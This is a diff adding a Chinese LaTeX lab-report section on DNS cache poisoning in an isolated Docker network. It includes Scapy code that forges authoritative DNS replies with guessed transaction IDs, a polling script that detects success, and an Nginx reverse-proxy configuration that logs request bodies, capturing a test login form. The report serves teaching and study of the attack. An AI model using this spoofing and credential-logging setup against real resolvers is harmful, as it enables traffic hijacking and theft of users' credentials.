@@ -1,0 +1,177 @@
+% 实验一：DNS 缓存污染攻击
+\section{实验一：DNS缓存污染攻击}
+
+\subsection{实验环境与网络拓扑}
+
+本实验使用 Docker Compose 搭建隔离的 DNS 缓存污染实验网络。攻击者向递归 DNS 服务器发送伪造的 DNS 响应；受害者定时查询 \texttt{test.seclab.online}；递归 DNS 服务器同时向权威 DNS 查询该域名。拓扑中还部署了模拟互联网网段、测试源站和代理 Web 服务器，用于验证污染后的访问路径。实验拓扑如图~\ref{fig:task1-topology} 所示。
+
+\begin{table}[H]
+    \centering
+    \caption{DNS 缓存污染实验的主机地址与角色}
+    \label{tab:task1-dns-hosts}
+    \renewcommand{\arraystretch}{1.25}
+    \begin{tabularx}{\linewidth}{l l X}
+        \toprule
+        主机角色 & IPv4 地址 & 实验用途 \\
+        \midrule
+        Attacker & \texttt{192.168.3.200} & 构造并发送伪造 DNS 响应 \\
+        Victim & \texttt{192.168.3.100} & 定时查询目标域名并访问测试网站 \\
+        递归 DNS & \texttt{192.168.5.53} & 递归查询权威 DNS 并缓存解析结果 \\
+        代理 Web & \texttt{192.168.5.80} & 接收污染后的 HTTP 请求并记录测试请求体 \\
+        权威 DNS & \texttt{198.51.100.53} & 返回目标域名的正常解析结果 \\
+        测试源站 & \texttt{198.51.100.80} & 为代理 Web 提供模拟网站内容 \\
+        \multirow{3}{*}{x86 路由器} & \texttt{192.168.3.254} & \multirow{3}{*}{连接实验网络与模拟互联网网段} \\
+        & \texttt{192.168.5.254} & \\
+        & \texttt{198.51.100.254} & \\
+        \bottomrule
+    \end{tabularx}
+\end{table}
+
+\labfigure[0.98\linewidth]{figures/task/1/topo.png}{DNS 缓存污染实验拓扑及各节点地址}{fig:task1-topology}
+
+\subsection{攻击前的 DNS 配置}
+
+首先在 Attacker 上查询 \texttt{test.seclab.online} 的 NS 记录，并进一步查询权威服务器名称的 A 记录。实验记录显示，该域名的权威服务器为 \texttt{ns1.test.seclab.online}，其地址为 \texttt{198.51.100.53}。构造伪造响应时，使用该地址作为 DNS 响应的源 IP，使伪造报文与递归服务器正在等待的权威服务器应答相对应，如图~\ref{fig:task1-authority-query} 所示。
+
+\labfigure[0.96\linewidth]{figures/task/1/ask_DNS_ip.png}{查询目标域名的权威服务器名称及其 IP 地址}{fig:task1-authority-query}
+
+为使攻击脚本能够匹配递归服务器发出的查询报文，在递归 DNS 的 BIND9 配置中将对外查询的 UDP 源端口固定为 \texttt{10001}。配置项如下：
+
+\Needspace{5\baselineskip}
+\begin{samepage}
+\begin{lstlisting}[language=bash,caption={递归 DNS 固定查询源端口的配置}]
+// 固定递归 DNS 对外查询时使用的 UDP 源端口
+query-source port 10001;
+\end{lstlisting}
+\end{samepage}
+
+配置文件截图如图~\ref{fig:task1-fixed-port} 所示。实验还在权威 DNS 所连接的网络接口上设置了 \texttt{1500ms} 的传输延迟，以延长递归服务器等待权威应答的时间窗口；相应的实验命令如图~\ref{fig:task1-authority-delay} 所示。
+
+\labfigure[0.96\linewidth]{figures/task/1/fix_port.png}{BIND9 递归 DNS 的固定查询源端口配置}{fig:task1-fixed-port}
+\labfigure[0.96\linewidth]{figures/task/1/add_relay_times.png}{为权威 DNS 网络接口设置 1500ms 延迟}{fig:task1-authority-delay}
+
+\subsection{构造伪造 DNS 响应}
+
+攻击目标为 \texttt{test.seclab.online}，伪造的 A 记录将其指向代理 Web 的地址 \texttt{192.168.5.80}。Scapy 构造的 DNS 资源记录包含目标域名、A 记录类型和伪造地址，运行结果如图~\ref{fig:task1-fake-record} 所示。攻击脚本中与报文构造相关的核心代码如下：
+
+\Needspace{29\baselineskip}
+\begin{samepage}
+\begin{lstlisting}[language=Python,caption={构造伪造 DNS 响应报文的关键代码}]
+# 伪造 A 记录，将实验域名指向代理 Web
+fake_rr = DNSRR(
+    rrname=VICTIM_DOMAIN,
+    type=1,
+    ttl=FAKE_TTL,
+    rdata=FAKE_IP,
+)
+
+# 设置伪造权威应答的以太网、IP 和 UDP 字段
+packet_base = (
+    Ether(src=get_if_hwaddr(INTERFACE), dst=RESOLVER_MAC)
+    / IP(src=AUTHORITATIVE_IP, dst=LOCAL_DNS_IP)
+    / UDP(sport=AUTHORITATIVE_PORT, dport=LOCAL_DNS_PORT)
+)
+
+# 使用候选 TXID，并保留与查询相同的域名问题
+dns_layer = DNS(
+    id=txid,
+    qr=1,
+    aa=1,
+    qd=DNSQR(qname=VICTIM_DOMAIN),
+    ancount=1,
+    an=fake_rr,
+)
+# 组合各协议层，得到待发送的伪造响应
+dns_packet = packet_base / dns_layer
+\end{lstlisting}
+\end{samepage}
+
+其中，IP 层源地址和 UDP 源端口分别设置为权威 DNS 地址 \texttt{198.51.100.53} 和 \texttt{53}；目的地址和目的端口分别为递归 DNS \texttt{192.168.5.53} 和固定端口 \texttt{10001}。DNS 的 \texttt{id} 字段是待猜测的事务 ID（TXID），\texttt{qr=1} 表示响应报文，\texttt{aa=1} 表示权威应答标志。答案区中的 A 记录将目标域名映射到实验代理地址。
+
+\labfigure[0.88\linewidth]{figures/task/1/code_1_run.png}{Scapy 构造的伪造 DNS A 资源记录}{fig:task1-fake-record}
+
+攻击脚本预先生成多组不同 TXID 的候选响应，并分批发送。每次尝试前先清空递归 DNS 缓存；启动攻击脚本并等待候选响应包生成后，立即启动攻击者侧的定时查询脚本 \texttt{DNS\_Query.py}。该脚本每隔 1 秒向递归 DNS 查询目标域名，检测到实验代理地址后写入成功标记，攻击脚本读取标记并停止发送。查询脚本的核心逻辑如下：
+
+\Needspace{17\baselineskip}
+\begin{samepage}
+\begin{lstlisting}[language=Python,caption={攻击者定时查询及污染成功判断}]
+QUERY_INTERVAL_SECONDS = 1.0
+
+def main():
+    while True:
+        # 每轮向实验递归 DNS 查询目标域名的 A 记录
+        result = subprocess.run(
+            ["dig", f"@{LOCAL_DNS_IP}", VICTIM_DOMAIN, "A",
+             "+time=4", "+tries=1", "+noall", "+answer"],
+            capture_output=True, text=True, timeout=5, check=False,
+        )
+        # 命中代理地址后通知攻击脚本停止发送
+        if FAKE_IP in result.stdout.split():
+            SUCCESS_FLAG.write_text("success\n", encoding="ascii")
+            return
+        # 等待至下一次定时查询
+        time.sleep(QUERY_INTERVAL_SECONDS)
+\end{lstlisting}
+\end{samepage}
+
+\subsection{污染过程与结果}
+
+攻击者的定时查询记录显示，递归 DNS 最初返回权威 DNS 提供的地址 \texttt{198.51.100.80}，其缓存 TTL 从 7 秒逐步递减至 1 秒，随后出现一次查询超时并重新取得正常记录。攻击脚本在此期间持续发送 TXID 候选响应。之后，攻击者的定时查询返回实验代理地址 \texttt{192.168.5.80}，伪造记录 TTL 为 120 秒，攻击脚本检测到成功标记后停止。该次过程记录了完成 4 轮、发送 110{,}592 个候选响应包，如图~\ref{fig:task1-poison-first} 所示。
+
+另一次运行中，攻击者侧定时查询也从权威地址 \texttt{198.51.100.80} 转为实验地址 \texttt{192.168.5.80}；攻击脚本完成 2 轮、共发送 65{,}536 个候选响应包后停止。随后 Victim 查询递归 DNS，得到 \texttt{test.seclab.online} 的 A 记录为 \texttt{192.168.5.80}。两次运行的终端记录分别见图~\ref{fig:task1-poison-first} 和图~\ref{fig:task1-poison-detail}。
+
+\labfigure[0.98\linewidth]{figures/task/1/posion_success.png}{定时 DNS 查询发现伪造记录，攻击脚本检测成功后停止}{fig:task1-poison-first}
+\labfigure[0.98\linewidth]{figures/task/1/posion_success_detail.png}{第二次污染结果及受害者解析与 HTTP 访问验证}{fig:task1-poison-detail}
+
+\subsection{代理 Web 配置与请求日志验证}
+
+代理 Web 使用 Nginx 接收发往 \texttt{test.seclab.online} 的 HTTP 请求，并将请求转发至模拟源站 \texttt{198.51.100.80}。为了在实验中观察表单提交内容，访问日志格式包含客户端地址、请求时间、请求行、状态码和请求体。关键配置如下：
+
+\Needspace{19\baselineskip}
+\begin{samepage}
+\begin{lstlisting}[language=bash,caption={代理 Web 的 Nginx 反向代理与请求体日志配置}]
+# 记录请求行、状态码和 HTTP 请求体
+log_format exp4_login '$remote_addr [$time_local] "$request" '
+                      '$status "$request_body"';
+
+server {
+    listen 80 default_server;
+    server_name test.seclab.online;
+    client_body_in_single_buffer on;
+    access_log /var/log/nginx/access.log exp4_login;
+
+    location / {
+        # 转发到实验源站，并保留目标域名 Host
+        proxy_pass http://198.51.100.80;
+        proxy_set_header Host test.seclab.online;
+        add_header X-Lab-Proxy exp4-task1 always;
+    }
+}
+\end{lstlisting}
+\end{samepage}
+
+模拟源站为登录路径提供实验用响应：
+
+\Needspace{9\baselineskip}
+\begin{samepage}
+\begin{lstlisting}[language=bash,caption={模拟源站对实验登录路径的响应}]
+# 登录路径返回实验用的模拟响应
+location = /lab-login {
+    default_type text/plain;
+    return 200 "mock lab submission received";
+}
+\end{lstlisting}
+\end{samepage}
+
+DNS 污染后，Victim 查询到代理地址 \texttt{192.168.5.80}，并通过 \texttt{curl} 访问 \url{http://test.seclab.online/}。返回结果为 HTTP 200，响应服务器为 Nginx。随后 Victim 向 \texttt{/lab-login} 提交实验用表单字段 \texttt{username=Sakura} 和 \texttt{password=123456}；代理服务器返回 HTTP 200，Nginx 访问日志中出现来源地址 \texttt{192.168.3.100}、请求路径 \texttt{/lab-login} 以及请求体 \texttt{username=Sakura\&password=123456}。日志记录验证了代理服务器能够读取本次实验请求中的表单字段，如图~\ref{fig:task1-nginx-log} 所示。
+
+\labfigure[0.98\linewidth]{figures/task/1/log_record.png}{Victim 提交实验表单后，代理 Web 的访问日志记录请求体}{fig:task1-nginx-log}
+
+\subsection{实验结果分析与小结}
+
+本实验通过固定递归 DNS 的查询源端口、延迟权威 DNS 的网络应答，并持续发送包含不同 TXID 的伪造 DNS 响应，使递归 DNS 将目标域名解析到实验代理 Web 的地址。受害者的周期查询记录和后续 \texttt{dig} 结果均显示目标域名解析为 \texttt{192.168.5.80}；HTTP 访问返回 Nginx 响应，表单请求则由代理服务器转发至模拟源站，并在访问日志中记录测试请求体。
+
+实验过程展示了 DNS 缓存污染从伪造响应构造、TXID 候选发送、受害者周期查询、污染结果确认到代理 Web 请求日志验证的完整链路。通过对 Nginx 的反向代理和日志格式进行配置，实验进一步观察了域名解析结果变化对后续 Web 访问路径的影响。
+
+实验过程中遇到的问题是，在实验一开始启动定时查询脚本和DNS污染脚本时过了很久都没有污染成功，总结原因可能是没有清理DNS递归解析服务器的缓存记录，也可能是在DNS污染脚本猜测正确TXID前，权威服务器就发送正确响应给递归解析服务器了。针对以上问题，实验改进方案为：
+在实验一开始启动各种脚本前先清空递归解析服务器的缓存记录，再先启动DNS污染脚本（会先与生成一批候选TXID）然后再启动定时查询脚本，这样就能更快的完成DNS缓存污染。
